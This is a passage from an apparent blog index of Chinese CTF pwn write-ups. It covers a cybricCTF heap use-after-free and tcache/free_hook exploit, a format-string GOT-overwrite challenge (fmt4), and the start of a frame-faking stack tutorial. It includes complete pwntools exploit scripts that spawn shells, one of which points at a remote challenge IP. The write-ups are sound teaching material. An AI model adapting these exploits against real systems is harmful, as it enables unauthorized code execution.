punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>write_addr <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> unpack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>base_addr <span class="token operator">=</span> write_addr<span class="token operator">-</span><span class="token number">0x910</span>system_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x940</span>r<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"3\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>readuntil<span class="token punctuation">(</span><span class="token string">"entry?"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"-4\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-cybricCTF-GrOSs1复现</title>
      <link href="//post/pwn-cybricCTF-GrOSs1%E5%A4%8D%E7%8E%B0.html"/>
      <url>//post/pwn-cybricCTF-GrOSs1%E5%A4%8D%E7%8E%B0.html</url>
      
        <content type="html"><![CDATA[<h1 id="cybricCTF-GrOSs1-复现"><a href="#cybricCTF-GrOSs1-复现" class="headerlink" title="cybricCTF GrOSs1 复现"></a>cybricCTF GrOSs1 复现</h1><p>cybricCTF真难啊 淦，全程几乎没有参与感，只能赛后复现下了QAQ</p><p>另：作为一个pwn手，还得好好学习re，不然pwn题源文件都看不懂。。。。</p><span id="more"></span><h2 id="0x00-IDA-分析"><a href="#0x00-IDA-分析" class="headerlink" title="0x00 IDA 分析"></a>0x00 IDA 分析</h2><p>附件上来就有4个文件，看的人头皮发麻（</p><p>简单分析下main，就是输入 SPAWN 可以调用process文件下的三个程序</p><p>之后先主要分析下storage</p><p>用 IDA64 打开是乱码，在 options  -&gt;  Complier…  -&gt;  编译器选项（complier）-&gt;  选择 GUN C++，才可以反汇编</p><p>之后IDA任然会出现好几个 未识别函数 ，在ida中以地址为红色标识，如图</p><p><img src="https://pic.imgdb.cn/item/60fe5dc45132923bf83b95b1.jpg"></p><p>红色部分就是未识别函数</p><p>选中红色部分，在 edit -&gt; funtions -&gt; 选择create funtion ， 将这一部分创建为一个新的函数，进而近一步反汇编</p><p>反汇编完之后，storage的主要逻辑在 D3E ，而 7F3 大概是menu，但是反汇编之后都是int型的数组，得全部参考ascii码转换成字符（char）来看。</p><p><img src="https://pic.imgdb.cn/item/60fe604b5132923bf845c722.jpg"></p><p><img src="https://pic.imgdb.cn/item/60fe602c5132923bf8455643.jpg"></p><p>接下来好好分析下storage的逻辑</p><p>delete函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">DELETE_A59</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+12h] [rbp-1Eh] BYREF</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token string">"Enter index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_582</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v2<span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">READ_653</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>result <span class="token operator">&lt;=</span> <span class="token number">0x7F</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">sub_4A4</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v3 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合gdb调试，这有一个明显的UAF漏洞</p><p>接下来就简单了，libc-2.31的UAF漏洞利用</p><h2 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01 利用思路"></a>0x01 利用思路</h2><p>先创建一个unsorted bin，然后free掉拿基地址，</p><p>接下来写free hook为system函数free掉一个 /bin/sh 拿shell</p><p>任意地址写简单利用Tcache Attack，就是逆向难，读懂源码后利用很常规</p><p>尝试过往malloc_hook写ogg,结果都不行，暂时还不知道为啥QAQ</p><h2 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf_name <span class="token operator">=</span> <span class="token string">'./main'</span>local <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> <span class="token punctuation">(</span>local<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>elf_name<span class="token punctuation">)</span>    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"109.233.61.10"</span><span class="token punctuation">,</span><span class="token string">"11710"</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>elf_name<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        recv <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">)</span>        <span class="token comment"># print("recv ==> ",recv)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">b' storage(1)&lt;'</span> <span class="token keyword">in</span> recv<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">b' shell(0)&lt;'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> recv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Process spawn = 1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shell(0)&lt; "</span><span class="token punctuation">,</span><span class="token string">"SPAWN"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Enter process name:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"shell(0)&lt; "</span><span class="token punctuation">,</span><span class="token string">"storage"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">myprint</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span>    <span class="token comment"># pause()</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        recv <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"&lt;"</span><span class="token punctuation">)</span>        <span class="token comment"># print("recv ==> ",recv)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">b' storage(1)>'</span> <span class="token keyword">in</span> recv<span class="token punctuation">)</span><span class="token punctuation">:</span>            ret <span class="token operator">=</span> recv<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> ret        <span class="token keyword">else</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    start<span class="token punctuation">(</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    main_arena_96 <span class="token operator">=</span> u64<span class="token punctuation">(</span>myprint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    main_arena <span class="token operator">=</span> main_arena_96 <span class="token operator">-</span><span class="token number">96</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;main_arena> ==> "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x1ebb80</span>    malloc_hook <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x10</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;libc_base> ==> "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;malloc_hook> ==> "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    free_hook <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> <span class="token number">0xab70</span> <span class="token operator">+</span> <span class="token number">0xdb28</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;free_hook> ==> "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    real_system <span class="token operator">=</span> libc_system <span class="token operator">+</span> libc_base    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&lt;system> ==> "</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>real_system<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    <span class="token comment">#main_arena  -> chunk2 -> chunk3</span>    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># #main_arena  -> chunk2 -> free_hook</span>    alloc<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>    alloc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>    edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>real_system<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># gdb.attach(p)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-fmt4</title>
      <link href="//post/pwn-fmt4.html"/>
      <url>//post/pwn-fmt4.html</url>
      
        <content type="html"><![CDATA[<h1 id="fmt4"><a href="#fmt4" class="headerlink" title="fmt4"></a>fmt4</h1><p>格式化字符串题</p><span id="more"></span><h2 id="0x00-elf分析"><a href="#0x00-elf分析" class="headerlink" title="0x00 elf分析"></a>0x00 elf分析</h2><p><img src="https://pic.imgdb.cn/item/60f90f3e5132923bf85f5d7e.jpg"></p><p>裸的格式化字符串，没啥好说的</p><p>这里我把<code>system(&quot;echo \&quot;EchoServer v1.0\&quot; &quot;)</code>改成了puts，结果一样的情况下方便使用gdb调试</p><p><img src="https://pic.imgdb.cn/item/60f90f865132923bf8609f3c.jpg"></p><p>64位，保护全关，</p><p><strong>尽管没开pie，但是使用one_gadget的时候也要加上基地址</strong>，我把这茬忘了，硬调了一个晚上没搞出来，淦！</p><h2 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h2><p>这里有2种思路，第一种是修改exit为One_ gadget，另一种是修改printf的got为system的got</p><p>由于保护全关，第二种思路明显更简单，因为不需要泄露基地址</p><h2 id="0x02-思路一"><a href="#0x02-思路一" class="headerlink" title="0x02 思路一"></a>0x02 思路一</h2><p>修改exit为One_ gadget</p><p><img src="https://pic.imgdb.cn/item/60f911045132923bf867290d.jpg"></p><p>由于是64位程序，这里的偏移应该为 6</p><p>则显然EXP为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./fmt4'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>clear<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%33$p'</span><span class="token punctuation">)</span> <span class="token comment"># __libc_start_main + 240</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>__libc_start_main_240 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> __libc_start_main_240<span class="token operator">-</span><span class="token number">0x20840</span><span class="token keyword">print</span> <span class="token string">'libc_base ==> '</span><span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x45226</span><span class="token keyword">print</span> <span class="token string">'ogg ==> '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>exit_got_addr<span class="token operator">=</span> <span class="token number">0x601048</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>exit_got_addr <span class="token punctuation">:</span> ogg<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x00\x00'</span><span class="token keyword">print</span> <span class="token string">"[payload] ==> "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token operator">+</span><span class="token string">'\x00\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-思路二"><a href="#0x03-思路二" class="headerlink" title="0x03 思路二"></a>0x03 思路二</h2><p>修改printf的got为system的got</p><p>直接改没啥好说的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./fmt4'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>clear<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>printf_got_addr <span class="token operator">=</span> <span class="token number">0x601028</span>sys_plt <span class="token operator">=</span> <span class="token number">0x4005d0</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>printf_got_addr <span class="token punctuation">:</span> <span class="token number">0x4005d0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'\x00\x00'</span><span class="token keyword">print</span> <span class="token string">"[payload] ==> "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"\\sh"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-关于-fmtstr-payload"><a href="#0x04-关于-fmtstr-payload" class="headerlink" title="0x04 关于 fmtstr_payload"></a>0x04 关于 fmtstr_payload</h2><p>fmtstr_payload是pwntools集成的一个函数，便于构造 格式化字符修改任意地址的payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span>offset<span class="token punctuation">,</span> writes<span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">)</span><span class="token comment">#第一个参数表示格式化字符串的偏移；</span><span class="token comment">#第二个参数表示需要利用%n写入的数据，采用字典形式，如果我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；本题是将0x601028处改为0x4005d0</span><span class="token comment">#第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span><span class="token comment">#第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。fmtstr_payload函数返回的就是payload</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具体参见 pwntools文档：<a href="https://docs.pwntools.com/en/stable/fmtstr.html">pwnlib.fmtstr — Format string bug exploitation tools — pwntools 4.6.0 documentation</a></p><p>更多格式化字符串参考： <a href="https://www.anquanke.com/post/id/85817">【技术分享】格式化字符串漏洞利用小结（二） - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-frame_faking</title>
      <link href="//post/pwn-frame-faking.html"/>
      <url>//post/pwn-frame-faking.html</url>
      
        <content type="html"><![CDATA[<h1 id="Frame-Faking"><a href="#Frame-Faking" class="headerlink" title="Frame Faking"></a>Frame Faking</h1><p>还欠下的技术栈（二）</p><p>果然一些以前看不懂的东西等学的东西多一点就慢慢能看明白了QAQ</p><span id="more"></span><p>正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>概括地讲，在之前讲的栈溢出不外乎两种方式</p><ul><li>控制程序 EIP</li><li>控制程序 EBP</li></ul><p>其最终都是控制程序的执行流。在 frame faking 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其 payload 如下</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">buffer padding|fake ebp|leave ret addr|<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要讲下后面两个部分</p><ul><li>函数的返回地址被我们覆盖为执行 leave ret 的地址，这就表明了函数在正常执行完自己的 leave ret 后，还会再次执行一次 leave ret。</li><li>其中 fake ebp 为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fake ebp|vebp2|target function addr|leave ret addr|arg1|arg2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们的 fake ebp 指向 ebp2，即它为 ebp2 所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p><p><strong>下面的汇编语法是 intel 语法。</strong></p><p>在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p><p>入口点</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push ebp  # 将ebp压栈mov ebp, esp #将esp的值赋给ebp<span aria-hidden="true" 